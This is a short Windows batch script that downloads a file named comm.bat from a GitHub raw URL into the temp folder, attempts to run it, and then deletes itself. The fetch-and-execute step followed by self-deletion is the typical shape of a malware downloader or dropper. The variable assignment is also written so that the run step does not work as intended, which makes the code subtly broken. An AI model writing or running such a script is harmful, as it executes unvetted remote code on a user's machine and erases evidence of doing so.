cd %temp%
curl -O https://raw.githubusercontent.com/Z-tech2/cmdBP/main/comm.bat
Set a = %temp%\comm.bat
%a%
del %0
